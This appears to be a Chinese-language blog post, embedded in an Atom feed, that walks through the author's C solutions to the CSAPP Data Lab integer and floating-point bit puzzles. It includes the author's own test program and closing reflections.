class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of </span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="type">int</span> tag = x | (~x + <span class="number">1</span>);</span><br><span class="line">  <span class="comment">// 0xaaaaaaaa or 0</span></span><br><span class="line">  <span class="type">int</span> s = tag &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="comment">// 0 or 1</span></span><br><span class="line">  <span class="keyword">return</span> s + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-howmanybits"><a class="markdownIt-Anchor" href="#10-howmanybits"></a> 10. howManyBits</h3><p>首先我们可以通过给出的几组示例发现，对于任何数，相当于查看其原码表示的最小位数，我们可以先将负数转化为于之对应的补数，两者的最小表示位数相同，计算后记作<code>y</code>。</p><p>接着我们利用二进制数的表示思路来处理，也就是说，我们可以通过16、8、4、2、1这几个数表示1到31的任意数字，也就意味我们只要验证处理这几次就可以表示出位数来</p><p>处理时有技巧，我们从利用能取大的先取大的原则，不断缩小y(进行移位),如果不能移位则用小数再试。具体见代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two&#x27;s complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">howManyBits</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">   <span class="type">int</span> mask, y, tag16, tag8, tag4, tag2, tag1, has16bit, has8bit, has4bit, has2bit, has1bit;</span><br><span class="line">  <span class="comment">//mask = x &lt; 0 ? 0xfffffffff : 0</span></span><br><span class="line">  mask = (x &gt;&gt; <span class="number">31</span>);</span><br><span class="line">  <span class="comment">//为负数去反</span></span><br><span class="line">  y = mask &amp; (~x) | (~mask) &amp; x;</span><br><span class="line">  <span class="comment">//判断是否满足16+1位 ? 1 : 0</span></span><br><span class="line">  tag16 = !!(y &gt;&gt; <span class="number">16</span>);</span><br><span class="line">  has16bit = tag16 &lt;&lt; <span class="number">4</span>;</span><br><span class="line">  y = y &gt;&gt; has16bit;</span><br><span class="line">  <span class="comment">//判断是否满足8位 ? 1 : 0</span></span><br><span class="line">  tag8 = !!(y &gt;&gt; <span class="number">8</span>);</span><br><span class="line">  has8bit = (tag8 &lt;&lt; <span class="number">3</span>);</span><br><span class="line">  y = y &gt;&gt; has8bit;</span><br><span class="line">  <span class="comment">//判断是否满足4位 ? 1 : 0</span></span><br><span class="line">  tag4 = !!(y &gt;&gt; <span class="number">4</span>);</span><br><span class="line">  has4bit = tag4 &lt;&lt; <span class="number">2</span>;</span><br><span class="line">  y = y &gt;&gt; has4bit;</span><br><span class="line">  <span class="comment">//判断是否满足2位 ? 1 : 0</span></span><br><span class="line">  tag2 = !!(y &gt;&gt; <span class="number">2</span>);</span><br><span class="line">  has2bit = tag2 &lt;&lt; <span class="number">1</span>;</span><br><span class="line">  y = y &gt;&gt; has2bit;</span><br><span class="line">  <span class="comment">//判断是否满足1位 ? 1 : 0</span></span><br><span class="line">  tag1 = !!(y &gt;&gt; <span class="number">1</span>);</span><br><span class="line">  has1bit = tag1 &lt;&lt; <span class="number">1</span>;</span><br><span class="line">  y = y &gt;&gt; has1bit;</span><br><span class="line">  <span class="keyword">return</span> has16bit + has8bit + has4bit + has2bit + has1bit + y + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此10道整数问题结束</p><h2 id="浮点数规则细节"><a class="markdownIt-Anchor" href="#浮点数规则细节"></a> 浮点数规则细节</h2><h3 id="可以使用"><a class="markdownIt-Anchor" href="#可以使用"></a> 可以使用</h3><ol><li>可以使用循环和条件控制</li><li>使用<code>int</code>和<code>unsigned</code>，并可以使用任何运算符号</li></ol><h3 id="禁止使用-2"><a class="markdownIt-Anchor" href="#禁止使用-2"></a> 禁止使用</h3><ol><li>宏</li><li>定义或调用函数</li><li>使用非<code>int</code>和<code>unsigned</code>类型的数据</li><li>使用任何浮点运算符号</li></ol><h2 id="浮点数具体题解"><a class="markdownIt-Anchor" href="#浮点数具体题解"></a> 浮点数具体题解</h2><h3 id="1-floatscale2"><a class="markdownIt-Anchor" href="#1-floatscale2"></a> 1. floatScale2</h3><p>只要熟悉浮点的规则就可以模拟出这个过程。</p><p>首先处理<strong>特殊情况</strong>（INF,NAN），其特点为<code>M</code>为<code>0xff</code>，此时返回这个数即可。</p><p>然后处理<strong>非标准数</strong>，需要确定是否会变成标准数，只要看<code>E</code>是否超过<code>0x7fffff</code>（也就是E所能表示的最大值即可）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatScale2</span><span class="params">(<span class="type">unsigned</span> uf)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> s, M, E, ans;</span><br><span class="line">  <span class="comment">//分解出s, M, E</span></span><br><span class="line">  s = uf &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  M = (uf &gt;&gt; <span class="number">23</span>) &amp; (<span class="number">0xff</span>);</span><br><span class="line">  E = uf &amp; (<span class="number">0x7fffff</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(M == <span class="number">0xff</span>)&#123; <span class="comment">// NaN、Infinity的情况</span></span><br><span class="line">    <span class="keyword">return</span> uf;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(M == <span class="number">0</span>)&#123; <span class="comment">//非规格化的情况</span></span><br><span class="line">    E = E &lt;&lt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(E &gt; <span class="number">0x7fffff</span>)&#123; <span class="comment">// 判断是否会变成规格化</span></span><br><span class="line">      M = M + <span class="number">1</span>;</span><br><span class="line">      E = E - <span class="number">0x800000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123; <span class="comment">//规格化的情况</span></span><br><span class="line">    M = M + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ans = (s&lt;&lt;<span class="number">31</span>) | (M &lt;&lt; <span class="number">23</span>) | E;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="floatfloat2int"><a class="markdownIt-Anchor" href="#floatfloat2int"></a> floatFloat2Int</h3><p>本题需要熟悉计算从浮点数转换为整数的规则，经过分析可以分为以下几种情况，</p><ol><li>特殊值 NaN 和 infinity 的情况，会返回<code>0x80000000u</code></li><li>非标准化的情况会返回0，因为非标准化表示的是小于1的数</li><li>实际阶数 a 满足<code>a &lt; 0</code>的数同样返回0，因为表示的数同样小于1</li><li>实际阶数 a 满足<code>0 &lt;= a &lt;= 23</code>的情况，保留整数部分的数，具体计算规则见代码</li><li>实际阶数 a 满足<code>a &gt; 23</code>，根据题目要求返回<code>0x80000000u</code></li></ol><p>其中非特殊情况还要加上符号位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">floatFloat2Int</span><span class="params">(<span class="type">unsigned</span> uf)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> s, M, E ;</span><br><span class="line">  <span class="type">int</span> ans, a;</span><br><span class="line">  <span class="comment">//分解出s, M, E</span></span><br><span class="line">  s = uf &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  M = (uf &gt;&gt; <span class="number">23</span>) &amp; (<span class="number">0xff</span>);</span><br><span class="line">  E = uf &amp; (<span class="number">0x7fffff</span>);</span><br><span class="line">  a = M - <span class="number">127</span>; <span class="comment">//a表示实际的阶数</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(M == <span class="number">0xff</span>)&#123; <span class="comment">// NaN、Infinity的情况</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(M == <span class="number">0</span>)&#123; <span class="comment">//非规格化的情况</span></span><br><span class="line">    ans = <span class="number">0</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a &lt; <span class="number">0</span>)&#123; <span class="comment">// 阶数为负的情况</span></span><br><span class="line">    ans = <span class="number">0</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span> (a &lt;= <span class="number">23</span>)&#123; <span class="comment">//阶数符合整数规则的情况</span></span><br><span class="line">    ans = (E &gt;&gt; (<span class="number">23</span> - a)) + (<span class="number">1</span> &lt;&lt; a);</span><br><span class="line">    <span class="comment">// printf(&quot;0x%x %d %d\n&quot;,uf, ans, a+1);</span></span><br><span class="line">  &#125;<span class="keyword">else</span>&#123; <span class="comment">//阶数溢出的情况</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(s)&#123;</span><br><span class="line">     ans = -ans;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3floatpower2"><a class="markdownIt-Anchor" href="#3floatpower2"></a> 3.floatPower2</h3><p><strong>一个小坑</strong> :出现<code>Timed out after 10 secs (probably infinite loop)</code>的情况，应该是虚拟机性能不佳，绝对时间的超时。可以使用参数<code>-T 20</code>将执行限制时间改为20秒即可。</p><p>本题需要实现一个浮点数对2的幂计算，我们容易想到的是，浮点数本身计数方式就是以2的幂次形式，因此通过改变其中<code>M</code>的部分就可以实现大部分浮点运算。很容易想到的是当超出最大能表示数时返回<code>0x7f800000</code>（即无限大），当小到无法表示时，输出0。</p><p>但是事实上如果仅仅考虑阶数的问题，其实并没有得到正确答案，<em>尽管这样做可以通过官方测试案例</em>，但并不是正确答案。其实不应只靠考虑标准浮点数，非标准浮点数同样也应该考虑在内，我们把<code>x + 121</code>记作<code>M</code>，也就是真实阶数数，当阶数在<code>0 =&lt; M &lt;= 23</code>时能用非标准浮点数表示，详见代码如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span></span><br><span class="line"><span class="comment"> *   Max ops: 30 </span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatPower2</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span>  ans; </span><br><span class="line">  <span class="comment">//真实的阶数</span></span><br><span class="line">  <span class="type">int</span> M = x + <span class="number">127</span>;</span><br><span class="line">  <span class="keyword">if</span>(M &gt; <span class="number">0xff</span>)&#123; <span class="comment">//表示无穷大</span></span><br><span class="line">    ans = <span class="number">0x7f800000</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(M  &gt; <span class="number">0</span>)&#123; <span class="comment">// 表示在标准浮点数表示的部分</span></span><br><span class="line">    ans = M &lt;&lt; <span class="number">23</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(M &gt; <span class="number">-23</span>)&#123; <span class="comment">// 表示在非标准浮点数表示的部分</span></span><br><span class="line">    ans = <span class="number">1</span> &lt;&lt; (M + <span class="number">22</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123; <span class="comment">// 小于浮点数表示的部分</span></span><br><span class="line">    ans = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了验证函数的正确性，我写了一个验证程序<code>mytest.c</code>在项目目录下简单测试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tests.c&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits.c&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//每种情况的测试数据</span></span><br><span class="line"><span class="type">int</span> test_data[] = &#123;<span class="number">0xfff</span>, <span class="number">12</span> - <span class="number">127</span>, <span class="number">0</span> - <span class="number">127</span>, <span class="number">-20</span> - <span class="number">127</span> , <span class="number">-23</span> - <span class="number">127</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">int</span> size = <span class="keyword">sizeof</span>(test_data) / <span class="keyword">sizeof</span>(<span class="type">int</span>);</span><br><span class="line">  <span class="comment">//重点测试数据</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">-50</span>; i &lt; <span class="number">100</span>; ++i)&#123;</span><br><span class="line">    <span class="type">unsigned</span> a, b;</span><br><span class="line">    a = test_floatPower2(i<span class="number">-127</span>);</span><br><span class="line">    b = floatPower2(i - <span class="number">127</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%u 0x%u\n&quot;</span>, a, b);</span><br><span class="line">    assert(a == b);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//自定数据测试</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; size ; ++i)&#123;</span><br><span class="line">    <span class="type">unsigned</span> a, b;</span><br><span class="line">    a = test_floatPower2(i);</span><br><span class="line">    b = floatPower2(i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%u 0x%u\n&quot;</span>, a, b);</span><br><span class="line">    assert(a == b);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们通过<code>gcc -m32 -o mytest mytest.c</code>编译后并执行<code>./mytest</code>。结果没有<code>abort</code>，一定程度验证正确性。</p><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><p>最后附上最终测试结果<br /><img src="https://pic4.zhimg.com/80/v2-35accbab920239a11b5d3bd2a11920ad.png" alt="Image" /></p><p>陆陆续续用了一周时间完成Lab1，我认为对计算机系统级的数据处理方式和技巧都有所学习，其中很多答案可能不是最优答案，欢迎大家留言讨论，共同学习。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文以记录个人学习CSAPP的过程，使用blog的方式记录能更专注的思考，不至于走马观花式的做实验。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;实验说明&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#实验说明&quot;</summary>
      
    
    
    
    <category term="CSAPP" scheme="https://lcjd99.github.io/categories/CSAPP/"/>
    
    
    <category term="C" scheme="https://lcjd99.github.io/tags/C/"/>
    
  </entry>
  
</feed>
